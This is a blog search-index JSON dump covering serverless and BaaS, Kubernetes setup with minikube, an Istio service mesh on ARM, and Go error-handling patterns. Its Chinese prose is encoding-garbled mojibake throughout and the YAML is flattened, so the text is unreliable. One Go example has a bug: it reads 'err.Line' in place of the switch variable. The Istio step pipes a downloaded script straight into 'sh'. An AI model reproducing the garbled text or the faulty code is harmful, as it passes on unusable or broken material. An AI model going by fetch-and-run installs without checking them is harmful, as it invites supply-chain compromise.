çš„ä¸»è¿›ç¨‹ä¸­ã€‚ä½†æŠŠæ•°æ®åº“å•ç‹¬æ‹¿å‡ºæ¥ï¼Œå†é€šè¿‡ä¸€ä¸ªè¿›ç¨‹å»è¿æ¥å¹¶è®¿é—®å®ƒï¼Œè¿™æ ·åˆä¼šæ˜¾è‘—å¢åŠ å†·å¯åŠ¨çš„æ—¶é—´ã€‚ è§£å†³åŠæ³•å°±æ˜¯ä¸å†è¿æ¥æ•°æ®åº“ï¼Œè€Œæ˜¯é€šè¿‡ RESTful API è®¿é—®æ•°æ®åº“ã€‚è¿™é‡Œçš„ RESTful API å®é™…ä¸Šå°±æ˜¯ä¸€ç§åç«¯å³æœåŠ¡ BaaS äº†ï¼Œå®ƒæä¾›äº†è®¿é—®åç«¯æ•°æ®åº“çš„æ¥å£ï¼Œä½¿å¾— FaaS ä¸å†éœ€è¦è€ƒè™‘æ•°æ®æŒä¹…åŒ–çš„é—®é¢˜ã€‚ ","date":"2021-09-10","objectID":"/cloud-native/:2:1","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"BaaS åç«¯ BaaS åŒ–ä¸ºäº†é™ä½è¿ç»´æˆæœ¬ï¼Œå¾€å¾€ä¼šå°†å¤æ‚ä¸šåŠ¡é€»è¾‘æ‹†åˆ†æˆå•ä¸€èŒè´£çš„å¾®æœåŠ¡ï¼Œå½¢æˆå¾®æœåŠ¡æ¶æ„ã€‚è¿™å°±è¦æ±‚å„å¾®æœåŠ¡ä¹‹é—´ç›¸å¯¹ç‹¬ç«‹ï¼Œæ„å‘³ç€æ¯ä¸ªæœåŠ¡çš„æ•°æ®åº“ä¹Ÿéœ€è¦è§£è€¦åˆã€‚å¯¹è¿™ç±»åˆ†å¸ƒå¼æ•°æ®åº“è€Œè¨€ï¼Œæœ€é‡è¦çš„å°±æ˜¯è§£å†³æ•°æ®ä¸€è‡´æ€§çš„é—®é¢˜ï¼Œä¾‹å¦‚é€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—æˆ–æ˜¯ Raft åè®®ç­‰ã€‚ å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒFaaS å’Œ BaaS çš„åº•å±‚å®é™…ä¸Šä½¿ç”¨å®¹å™¨æŠ€æœ¯å®ç°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°ç”¨ Kubernetes æ­å»ºè‡ªå·±çš„ Serverless å¹³å°ï¼ˆè§åæ–‡ Kubernetes éƒ¨åˆ†ï¼‰ã€‚ ","date":"2021-09-10","objectID":"/cloud-native/:2:2","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"ç¼ºç‚¹ æŠ€æœ¯å°šä¸æˆç†Ÿï¼Œè®¸å¤šäº‘æœåŠ¡å•†æä¾›çš„ Serverless æœåŠ¡å­˜åœ¨ä¸å°‘ bug Serverless å¹³å°å¯¹å¼€å‘è€…æ¥è¯´æ˜¯ä¸ªé»‘ç›’å­ï¼Œæƒ³åœ¨ä¸Šé¢è°ƒè¯•ä»£ç ã€æ’æŸ¥é—®é¢˜ï¼Œéœ€è¦ä»˜å‡ºæå¤§æˆæœ¬ åŒç†ï¼ŒServerless å¹³å°ä¸Šçš„è¿è¡Œæ—¶ç¯å¢ƒåªæ”¯æŒéƒ¨åˆ†å®šåˆ¶ æ¯æ¬¡éƒ¨ç½²ä»£ç éƒ½éœ€è¦å‹ç¼©ä»£ç åä¸Šä¼ ï¼Œè¾ƒç¹ç äº‘æœåŠ¡å•†æä¾›çš„ç”Ÿæ€ï¼ˆå¦‚ä»£ç è°ƒè¯•å·¥å…·ï¼‰éƒ½æ˜¯å°é—­çš„ï¼Œå½¢æˆ Vendor-lockï¼›è¿™ä¸€ç‚¹å¯èƒ½å¯ä»¥é€šè¿‡ Serverlessã€Midway FaaS ç­‰æ¡†æ¶è§£å†³ ","date":"2021-09-10","objectID":"/cloud-native/:2:3","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"Kubernetes ","date":"2021-09-10","objectID":"/cloud-native/:3:0","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"æ¶æ„ K8s ç”¨æ¥ç®¡ç†å®¹å™¨é›†ç¾¤ï¼Œå®ƒçš„å¥½å¤„åœ¨ å®˜æ–¹æ–‡æ¡£ é‡Œå·²ç»å†™å¾—å¾ˆæ¸…æ¥šäº†ï¼Œè€Œå®ƒçš„åŸç†å¤§è‡´å¯ä»¥æ¦‚æ‹¬ä¸ºä¸€å¼ æ¶æ„å›¾ï¼š å›¾ 1ï½œK8s æ¶æ„ \" å›¾ 1ï½œK8s æ¶æ„ é€šè¿‡ CLI å·¥å…· kubectlï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®åˆ°è¿è¡Œåœ¨ K8s Master Node ä¸Šçš„ API Serverï¼Œä¹Ÿæ˜¯æ•´ä¸ªé›†ç¾¤çš„æ ¸å¿ƒã€‚Node å®é™…ä¸Šæ˜¯å¯¹è®¡ç®—èµ„æºçš„ä¸€ç§æŠ½è±¡ï¼Œæ¯ä¸ª Node ä¸Šè¿è¡Œä¸€ä¸ªæˆ–å¤šä¸ª Podï¼Œå³åº”ç”¨å®ä¾‹ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸€ä¸ª Pod ä¸Šæ¨èè¿è¡Œä¸€ä¸ªå®¹å™¨ã€‚ åœ¨ Master Node ä¸Šè¿˜æœ‰é”®å€¼æ•°æ®åº“ etcdã€ç›‘è§† Pod çš„è°ƒåº¦å™¨ Schedulerã€ä¸åŒç±»å‹çš„æ§åˆ¶å™¨ Controller Manager ä»¥åŠè¿æ¥äº‘æœåŠ¡å‚å•† API çš„ Cloud Controller Managerã€‚ è€Œåœ¨æ™®é€š Node ä¸Šåˆ™è¿è¡Œäº†ä¸€ä¸ª kubeletï¼Œè´Ÿè´£é€šçŸ¥ API Server å®¹å™¨è¿è¡ŒçŠ¶æ€ã€‚æ­¤å¤–ï¼Œä¸ºäº†è®©å¤–ç•Œèƒ½å¤Ÿè®¿é—®åˆ°å®¹å™¨è¿è¡Œçš„æœåŠ¡ï¼Œéœ€è¦ç”¨ K8s Service é€šè¿‡ kube-proxy æš´éœ²è¯¥æœåŠ¡ã€‚ æœ€åï¼Œä¸åŒçš„ K8s é›†ç¾¤ä¹‹é—´é€šè¿‡ Namespace éš”ç¦»ï¼Œæ³¨æ„è¿™å’Œä¸Šæ–‡å†™å®¹å™¨æŠ€æœ¯æ—¶æåˆ°çš„ Linux Namespace å¹¶éåŒä¸€æ¦‚å¿µï¼Œå°½ç®¡æ€æƒ³æ˜¯ç›¸ä¼¼çš„ã€‚ ","date":"2021-09-10","objectID":"/cloud-native/:3:1","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"å®‰è£… K8s çš„å®‰è£…ä»¤äººæƒŠè®¶åœ°ç®€å•ã€‚å°±åƒæˆ‘ä»¬åœ¨æ¶æ„å›¾ä¸­çœ‹åˆ°çš„é‚£æ ·ï¼Œå®‰è£… K8s ä¸»è¦åˆ†ä¸ºå®‰è£… kubectl å’Œ å®‰è£… K8s é›†ç¾¤ä¸¤ä¸ªæ­¥éª¤ã€‚ å®‰è£… K8s é›†ç¾¤ ç¬¬ä¸€ç§æ–¹å¼æ˜¯é€šè¿‡ Docker Desktop å®‰è£…ã€‚å®é™…ä¸Š Docker Desktop è‡ªå¸¦äº† K8sï¼ˆä¸æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼Œä½†ä¹Ÿæ¯”è¾ƒæ–°ï¼‰ï¼Œåœ¨è®¾ç½®é‡Œå‹¾é€‰å³å¯ã€‚ ç¬¬äºŒç§æ–¹å¼æ˜¯é€šè¿‡ kubeadmã€minikubeã€kind ç­‰å·¥å…·å®‰è£…ï¼Œæ— è®ºå“ªç§æ–¹å¼éƒ½æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œä»¥ minikube ä¸ºä¾‹ã€‚ minikube å†…ç½®äº† kubectlï¼Œæ‰€ä»¥ä¹‹åå¯ä»¥é€‰æ‹©ä¸å¦å¤–å®‰è£… kubectlã€‚ æŒ‰ç…§ å®˜æ–¹æ–‡æ¡£ï¼Œç›´æ¥ install äºŒè¿›åˆ¶æ–‡ä»¶å³å¯ã€‚ $ curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-darwin-amd64 $ sudo install minikube-darwin-amd64 /usr/local/bin/minikube å®‰è£… kubectl brew install kubectlï¼Œæ²¡äº†ã€‚ ç„¶è€Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œkubectl ç‰ˆæœ¬å’Œ K8s é›†ç¾¤ç‰ˆæœ¬ä¹‹é—´ç›¸å·®ä¸èƒ½è¶…è¿‡ 0.0.2ï¼Œå¦åˆ™å®¹æ˜“å‡ºç°ä¸å…¼å®¹çš„æƒ…å†µã€‚ä¾‹å¦‚ï¼Œå¦‚æœç”¨ Docker Desktop å®‰è£…çš„ 1.21.4 ç‰ˆæœ¬çš„é›†ç¾¤ï¼Œåˆ™éœ€è¦æ‰‹åŠ¨å®‰è£…ï¼š $ curl -LO \"https://dl.k8s.io/release/v1.21.4/bin/darwin/arm64/kubectl\" $ chmod +x ./kubectl $ sudo mv ./kubectl /usr/local/bin/kubectl $ sudo chown root: /usr/local/bin/kubectl ","date":"2021-09-10","objectID":"/cloud-native/:3:2","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"å®è·µ é¦–å…ˆè®¾ç½®å¥½åˆ«åï¼Œæ–¹ä¾¿åç»­æ“ä½œï¼ˆè¿™é‡Œç›´æ¥ä½¿ç”¨äº† minikube å†…ç½®çš„ kubectlï¼‰ï¼š alias k=\"minikube kubectl --\" alias dps=\"docker ps -a\" alias dr=\"docker rm -f\" alias dil=\"docker image ls\" alias dir=\"docker image rm\" alias ds=\"docker start\" alias dx=\"docker exec -it\" alias mk=\"minikube\" å¯åŠ¨ minikubeï¼š $ mk start éƒ¨ç½²åº”ç”¨å¹¶æ£€æŸ¥ï¼š $ k create deploy echo-server --image=k8s.gcr.io/echoserver-arm:1.8 $ k get deploy # result: NAME READY UP-TO-DATE AVAILABLE AGE echo-server 1/1 1 1 1m å› ä¸ºæ˜¯ M1 èŠ¯ç‰‡ï¼Œæ‰€ä»¥ç”¨çš„ ARM é•œåƒã€‚ æ£€æŸ¥ Pod æƒ…å†µï¼š $ k get po # result: NAME READY STATUS RESTARTS AGE echo-server-9f4db688c-r288r 1/1 Running 0 89 æš´éœ²æœåŠ¡å¹¶æ£€æŸ¥ï¼š $ k expose deploy echo-server --type=LoadBalancer --port=8080 $ k get svc # result: NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE echo-server LoadBalancer 10.111.217.237 \u003cpending\u003e 8080:31389/TCP 1m kubernetes ClusterIP 10.96.0.1 \u003cnone\u003e 443/TCP 100m è¿™é‡Œæš´éœ²äº†ä¸€ä¸ª LoadBalancer ç±»å‹çš„æœåŠ¡ï¼Œä¹Ÿå¯ä»¥æ¢æˆ NodePort ç±»å‹æœåŠ¡ã€‚8080 æ˜¯æˆ‘ä»¬çš„ echoserver å®¹å™¨å†…çš„æœåŠ¡ç«¯å£ã€‚ æ­¤å¤–ï¼Œå¯ä»¥å‘ç°è¿˜æœ‰ä¸€ä¸ª kubernetes æœåŠ¡ï¼Œè¿™å°±æ˜¯ K8s é›†ç¾¤çš„ API Serverã€‚ ä¸ºäº†è®¿é—®æš´éœ²çš„æœåŠ¡ï¼Œå¯ä»¥æ‰‹åŠ¨ç«¯å£è½¬å‘ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ minikube è‡ªåŠ¨è®¿é—®ï¼š $ mk service echo-server æ³¨æ„åˆ°ä¸Šé¢ echo-server çš„ EXTERNAL-IP è¿˜åœ¨ç­‰å¾…åˆ†é…ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç”¨ mk tunnel å»ºç«‹éš§é“ä»è€Œåˆ†é…å¤–éƒ¨è®¿é—®çš„ IPã€‚ ä¸Šè¿°ä¿¡æ¯ä¹Ÿå¯ä»¥é€šè¿‡ Dashboard å›¾å½¢åŒ–ç•Œé¢æŸ¥çœ‹ï¼š $ mk dashboard æœ‰è¶£çš„æ˜¯ï¼ŒK8s æœåŠ¡ä¹Ÿæ˜¯ç”± K8s è‡ªå·±ç®¡ç†çš„ï¼Œå®ƒè¿è¡Œåœ¨ kube-system çš„ Namespace ä¸­ã€‚ $ k get po,svc -n kube-system # result: NAME READY STATUS RESTARTS AGE pod/coredns-78fcd69978-xlh28 1/1 Running 0 141m pod/etcd-minikube 1/1 Running 0 142m pod/kube-apiserver-minikube 1/1 Running 0 142m pod/kube-controller-manager-minikube 1/1 Running 0 142m pod/kube-proxy-gblfw 1/1 Running 0 141m pod/kube-scheduler-minikube 1/1 Running 0 142m pod/storage-provisioner 1/1 Running 1 (141m ago) 142m NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/kube-dns ClusterIP 10.96.0.10 \u003cnone\u003e 53/UDP,53/TCP,9153/TCP 142m å¯¹äºå…¶ä»–å¹³å°ï¼Œkubectl å‘½ä»¤ä¸å˜ï¼Œæ›¿æ¢ä¸Šè¿° mk ç›¸å…³å‘½ä»¤å³å¯ã€‚ ","date":"2021-09-10","objectID":"/cloud-native/:3:3","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"Service Mesh å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œå¾®æœåŠ¡ä¹‹é—´å¿…é¡»è¦é€šä¿¡ï¼Œå¯¼è‡´å¾®æœåŠ¡é€šä¿¡ç›¸å…³ä»£ç å’Œä¸šåŠ¡ä»£ç çš„å¼ºè€¦åˆã€‚Service Mesh æ­£æ˜¯ä¸ºäº†æŠ½ç¦»å‡ºå¾®æœåŠ¡é€šä¿¡çš„é€»è¾‘ï¼Œè®©å¼€å‘è€…ä¸“æ³¨äºä¸šåŠ¡ä»£ç ç¼–å†™ã€‚å®ƒåœ¨æ•°æ®é¢æ¿ä¸­é€šè¿‡ Sidecar åŠ«æŒå¾®æœåŠ¡ Pod çš„æµé‡ï¼Œä»è€Œæ¥ç®¡äº†æ•´ä¸ªç½‘ç»œé€šä¿¡çš„åŠŸèƒ½ã€‚ ","date":"2021-09-10","objectID":"/cloud-native/:4:0","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"Istio å®‰è£… Kubernetes é‡‡ç”¨ Istio ä½œä¸º Server Meshï¼Œé¦–å…ˆä¸‹è½½å¹¶å®‰è£…ï¼Œå®‰è£…å‰è®°å¾—ç»™ Docker Desktop æˆ– minikube åˆ†é… 8 - 16 G å†…å­˜ï¼š $ curl -L https://istio.io/downloadIstio | sh - $ mv istio-1.11.2/bin/istioctl /usr/local/bin $ istioctl install --set profile=demo -y ä»¤äººç—›å¿ƒçš„æ˜¯ï¼ŒIstio å®˜æ–¹ å¹¶ä¸æ”¯æŒã€ä¹Ÿ ä¸æ‰“ç®—æ”¯æŒ ARM æ¶æ„ï¼Œå› æ­¤åœ¨ M1 ä¸‹å®‰è£…æ—¶ä¸èƒ½ç›´æ¥ä½¿ç”¨æœ€åä¸€è¡Œå‘½ä»¤è‡ªåŠ¨åŒ–å®‰è£…ï¼Œè€Œéœ€è¦å€ŸåŠ© è¿™ä¸ªç¤¾åŒºç‰ˆé•œåƒï¼Œè‡ªå·±ç¼–å†™ Operator è¿›è¡Œå®‰è£…ï¼š apiVersion:install.istio.io/v1alpha1kind:IstioOperatormetadata:namespace:istio-systemname:arm-istiocontrolplanespec:hub:docker.io/querycapistioprofile:democomponents:pilot:k8s:# each components have to set thisaffinity:\u0026affinitynodeAffinity:preferredDuringSchedulingIgnoredDuringExecution:- preference:matchExpressions:- key:beta.kubernetes.io/archoperator:Invalues:- arm64- amd64weight:2requiredDuringSchedulingIgnoredDuringExecution:nodeSelectorTerms:- matchExpressions:- key:beta.kubernetes.io/archoperator:Invalues:- arm64- amd64egressGateways:- name:istio-egressgatewayk8s:affinity:*affinityenabled:trueingressGateways:- name:istio-ingressgatewayk8s:affinity:*affinityenabled:true å°†è¿™ä¸ª Operator ä¿å­˜ä¸º install-istio.ymlï¼Œéšå istioctl install -f ./install-istio.yml å®Œæˆå®‰è£…ã€‚ ","date":"2021-09-10","objectID":"/cloud-native/:4:1","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"åº”ç”¨éƒ¨ç½² å®‰è£…å®Œæˆåï¼Œè®°å¾—å¼€å¯ Sidecar æ³¨å…¥æ¥åŠ«æŒæµé‡ï¼š $ k label ns default istio-injection=enabled éšåå³å¯éƒ¨ç½²åº”ç”¨å¹¶æŸ¥çœ‹çŠ¶æ€ï¼š $ k apply -f samples/bookinfo/platform/kube/bookinfo.yaml $ k get po # result: NAME READY STATUS RESTARTS AGE details-v1-79f774bdb9-ns6gl 2/2 Running 0 76s productpage-v1-6b746f74dc-qp7mg 2/2 Running 0 76s ratings-v1-b6994bb9-mflsk 2/2 Running 0 76s reviews-v1-545db77b95-24tsl 2/2 Running 0 76s reviews-v2-7bf8c9648f-b8bq4 2/2 Running 0 76s reviews-v3-84779c7bbc-hxkxg 2/2 Running 0 76s $ k get svc # result: NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE details ClusterIP 10.102.117.210 \u003cnone\u003e 9080/TCP 105s kubernetes ClusterIP 10.96.0.1 \u003cnone\u003e 443/TCP 27m productpage ClusterIP 10.101.203.214 \u003cnone\u003e 9080/TCP 105s ratings ClusterIP 10.105.60.88 \u003cnone\u003e 9080/TCP 105s reviews ClusterIP 10.100.137.99 \u003cnone\u003e 9080/TCP 105s æœ€åï¼Œæ£€æŸ¥å®é™…åº”ç”¨æ˜¯å¦æ­£å¸¸è¿è¡Œï¼š $ k exec \"$(k get po -l app=ratings -o jsonpath='{.items[0].metadata.name}')\" -c ratings -- curl -sS productpage:9080/productpage | grep -o \"\u003ctitle\u003e.*\u003c/title\u003e\" # result: \u003ctitle\u003eSimple Bookstore App\u003c/title\u003e ä¸Šè¿°å‘½ä»¤çš„æ„æ€æ˜¯ï¼šåœ¨ ratings å¯¹åº”çš„ pod ä¸­çš„ ratings å®¹å™¨é‡Œè¿è¡Œ curl -sS productpage:9080/productpage å‘èµ·è¯·æ±‚ï¼Œå¹¶åœ¨è¿”å›çš„ html ä¸­æŸ¥æ‰¾æ ‡é¢˜ã€‚éœ€è¦è¿™ä¹ˆå¤æ‚æ˜¯å› ä¸ºæ­¤æ—¶æˆ‘ä»¬çš„æœåŠ¡è¿˜æ²¡æœ‰å¤–éƒ¨ IPï¼Œåªèƒ½åœ¨é›†ç¾¤å†…éƒ¨è®¿é—®ã€‚ ","date":"2021-09-10","objectID":"/cloud-native/:4:2","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"é€šè¿‡ Ingress ç½‘å…³è®©åº”ç”¨èƒ½å¤Ÿä»å¤–éƒ¨è®¿é—® é¦–å…ˆéƒ¨ç½²å¥½è®¾ç½®äº†ç½‘å…³çš„åº”ç”¨å¹¶æ£€æŸ¥ï¼š $ k apply -f samples/bookinfo/networking/bookinfo-gateway.yaml $ istioctl analyze è·å–ä¸»æœºã€http2 ç«¯å£å’Œ https ç«¯å£ï¼š $ export INGRESS_HOST=$(k -n istio-system get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].ip}') $ export INGRESS_PORT=$(k -n istio-system get svc istio-ingressgateway -o jsonpath='{.spec.ports[?(@.name==\"http2\")].port}') å¦‚æœè®¾ç½®å®Œå $INGRESS_HOST ä¸ºç©ºï¼Œè¯´æ˜ LoadBalancer æ­¤æ—¶çš„åœ°å€ä¸ºä¸»æœºåè€Œä¸æ˜¯ IPï¼Œåªéœ€è¦ä¿®æ”¹ä¸€ä¸‹è®¾ç½®å³å¯ï¼š $ export INGRESS_HOST=$(k -n istio-system get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].hostname}') éšåè®¿é—® http://$INGRESS_HOST:$INGRESS_PORT å³å¯ã€‚ ","date":"2021-09-10","objectID":"/cloud-native/:4:3","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["äº‘"],"content":"é€šè¿‡ Kiali æŸ¥çœ‹å›¾å½¢åŒ–ç•Œé¢ å®‰è£… Kialiã€Prometheusã€Grafanaã€Jarger ç­‰æ’ä»¶ï¼Œæ£€æŸ¥éƒ¨ç½²çŠ¶æ€ï¼š $ k apply -f samples/addons/ $ k rollout status deploy kiali -n istio-system éšåå°±å¯ä»¥æŸ¥çœ‹å›¾å½¢åŒ–ç•Œé¢äº†ï¼š $ istioctl dashboard kiali ç¼–å†™è„šæœ¬äº§ç”Ÿæµé‡ï¼š for i in $(seq 1 100); do curl -s -o /dev/null \"http://localhost/productpage\"; done æœ€åå°±å¯ä»¥çœ‹åˆ°æ•´ä¸ª Service Mesh çš„æ¶æ„ã€ä»¥åŠç½‘ç»œè¯·æ±‚æ•°æ®æµäº†ï¼Œéå¸¸æ¸…æ™°ã€‚ ","date":"2021-09-10","objectID":"/cloud-native/:4:4","tags":["Docker","Kubernetes","ARM"],"title":"é£è°²äº‘è¯¡ï¼šäº‘åŸç”ŸæŠ€æœ¯åŸç†","uri":"/cloud-native/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"åº•å±‚åŒ…è£…ã€ä¸­å±‚ä¼ é€’ã€é¡¶å±‚å¤„ç†ã€‚ ","date":"2021-09-08","objectID":"/go-error/:0:0","tags":["Go"],"title":"è¿·é€”çŸ¥è¿”ï¼šGo Error å¤„ç†","uri":"/go-error/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"Sentinel Errors go ä¸­å­˜åœ¨ä¸€äº›é¢„å®šä¹‰çš„é”™è¯¯ï¼Œæ¯”å¦‚ io.EOFï¼Œåœ¨ä½¿ç”¨æ—¶é€šå¸¸ç”¨ if err == io.EOF çš„å½¢å¼æ¥æ¯”è¾ƒä¸¤ä¸ªé”™è¯¯æ˜¯å¦ â€œç›¸ç­‰â€ã€‚ç„¶è€Œï¼Œå¦‚æœé”™è¯¯ä¸­éœ€è¦æºå¸¦ä¸€äº›é”™è¯¯ä¿¡æ¯ï¼Œå°±ä¸å¾—ä¸é‡‡ç”¨å¦‚ä¸‹ä¸¤ç§æ–¹æ³•ä¹‹ä¸€ï¼š è¿”å›ä¸€ä¸ªä¸åŒçš„ã€æºå¸¦äº†é”™è¯¯ä¿¡æ¯çš„é”™è¯¯ã€‚è¿™ä¼šå„¿å¯¼è‡´åœ¨å’Œ Sentinel Error æ¯”è¾ƒæ—¶ï¼Œ == å¤±æ•ˆã€‚ ç”¨ fmt.Errorf()ï¼ŒåŒæ ·ä¼šå¯¼è‡´ == å¤±æ•ˆã€‚ æ­¤æ—¶ï¼Œæˆ‘ä»¬åªèƒ½ä½¿ç”¨ error.Error() æ¥åœ¨ç¨‹åºä¸­åˆ¤æ–­é”™è¯¯ç±»å‹ï¼Œç„¶è€Œè¿™ä¸ªæ–¹æ³•è®¾è®¡åˆè¡·ä»…ä»…æ˜¯ä¸ºäº†æä¾›é”™è¯¯ä¿¡æ¯ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œå¦‚æœåœ¨ç¼–å†™ API æ—¶ä½¿ç”¨ Sentinel Errorï¼Œåˆ™è¯¥ Error ä¼šæˆä¸º API çš„å…¬å…±éƒ¨åˆ†ã€‚åŒæ—¶ï¼Œä¹Ÿä¼šä»…ä»…å› ä¸ºéœ€è¦åˆ¤æ–­ä¸€ä¸ªé”™è¯¯è€Œå¼•å…¥ä¸€ä¸ªä¸å¿…è¦çš„ä¾èµ–ã€‚ç”±äºä¸Šè¿°ä¸‰ä¸ªç¼ºç‚¹ï¼Œæˆ‘ä»¬éœ€è¦å°½é‡é¿å…ä½¿ç”¨ Sentinel Errorã€‚ ","date":"2021-09-08","objectID":"/go-error/:1:0","tags":["Go"],"title":"è¿·é€”çŸ¥è¿”ï¼šGo Error å¤„ç†","uri":"/go-error/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"Custom Errors é€šè¿‡å®ç° error æ¥å£æ¥è‡ªå®šä¹‰é”™è¯¯ç±»å‹ï¼š type MyError struct { Msg string File string Line int } func (e *MyError) Error() string { return fmt.Sprintf(\"%s:%d %s\", e.File, e.Line, e.Msg) } func test() error { return \u0026MyError{\"Somthing happened\", \"server.go\", 42} } func main() { err := test() switch Err := err.(type) { case nil: // success case *MyError: fmt.Println(\"error in line:\", err.Line) default: // unknown } } è¿™ç§åšæ³•èƒ½å¤Ÿè¿”å›é¢å¤–çš„é”™è¯¯ä¿¡æ¯ï¼Œç„¶è€Œå¹¶æ²¡æœ‰è§£å†³ Sentinel Error çš„ç¬¬äºŒä¸ªé—®é¢˜ï¼Œå› æ­¤ä¹Ÿä¸æ¨èåœ¨ç¼–å†™ API æ—¶è¿‡å¤šä½¿ç”¨ã€‚ ","date":"2021-09-08","objectID":"/go-error/:2:0","tags":["Go"],"title":"è¿·é€”çŸ¥è¿”ï¼šGo Error å¤„ç†","uri":"/go-error/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"Opaque Errors ä¸é€æ˜å°±æ˜¯æŒ‡å½“å‰å‡½æ•°çŸ¥é“å‘ç”Ÿäº†é”™è¯¯ï¼Œä½†å¹¶ä¸æ¸…æ¥šé™¤æ­¤ä»¥å¤–çš„ä»»ä½•ç»†èŠ‚ã€‚å®é™…ä¸Šå°±æ˜¯ï¼š func fn() error { //... if err != nil { return err } // ... } ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç¡®å®éœ€è¦åœ¨å½“å‰å‡½æ•°é‡Œè·å–é”™è¯¯çš„ä¸€äº›ç»†èŠ‚å‘¢ï¼Ÿæ­¤æ—¶æˆ‘ä»¬ä¸åº”è¯¥è€ƒè™‘å»åˆ¤æ–­é”™è¯¯çš„ç±»å‹æˆ–å€¼ï¼Œè€Œæ˜¯åˆ¤æ–­é”™è¯¯æ˜¯å¦æ‰§è¡Œäº†æŸäº›è¡Œä¸ºï¼š package net type Error interface { error Timeout() bool Temporary() bool } if nerr, ok := err.(net.Error); ok \u0026\u0026 nerr.Temporary() { // handle error } å®é™…åº”ç”¨ä¸­ï¼Œå¯ä»¥å•ç‹¬ç¼–å†™å‡½æ•°æ¥åˆ¤æ–­é”™è¯¯æ‰§è¡Œçš„è¡Œä¸ºï¼š type temporary interface { Temporary() bool } func IsTemporary(err error) bool { te, ok := err.(temporary) return ok \u0026\u0026 te.Temporary() } è¿™ç§åšæ³•ä½¿å¾—æˆ‘ä»¬ä¸éœ€è¦å¯¼å…¥å®šä¹‰é”™è¯¯çš„åŒ…ï¼Œä¹Ÿä¸éœ€è¦äº†è§£é”™è¯¯çš„ç±»å‹ä¿¡æ¯ï¼Œç›¸å¯¹çµæ´»ã€‚åªä¸è¿‡ï¼Œå®ƒä»ç„¶ä¸èƒ½è§£å†³å¦‚ä½•è¿”å›é”™è¯¯ä¿¡æ¯çš„é—®é¢˜ã€‚ ","date":"2021-09-08","objectID":"/go-error/:3:0","tags":["Go"],"title":"è¿·é€”çŸ¥è¿”ï¼šGo Error å¤„ç†","uri":"/go-error/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"Wrap Errors ä¸ºäº†å½»åº•è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ github.com/pkg/errors åŒ…ã€‚å®ƒæä¾›äº†ï¼š Wrap() æ–¹æ³•æ¥åŒ…è£…é”™è¯¯ã€é”™è¯¯ä¿¡æ¯å’Œå †æ ˆä¿¡æ¯ Cause() æ–¹æ³•æ¥è§£åŒ…è£…ä»¥å¾—åˆ°åŸæ¥çš„é”™è¯¯æœ¬èº« WithMessage() æ–¹æ³•ä»…åŒ…è£…é”™è¯¯å’Œé”™è¯¯ä¿¡æ¯ è¿™ä½¿å¾—æˆ‘ä»¬æ—¢èƒ½å¤Ÿè·å¾—é”™è¯¯æœ¬èº«ã€åˆèƒ½å¤Ÿè·å¾—é”™è¯¯ä¿¡æ¯ï¼Œä½¿ç”¨èµ·æ¥å¾ˆæ–¹ä¾¿ï¼š åœ¨ä¸šåŠ¡ä»£ç ä¸­ï¼Œä¸€èˆ¬ä½¿ç”¨ 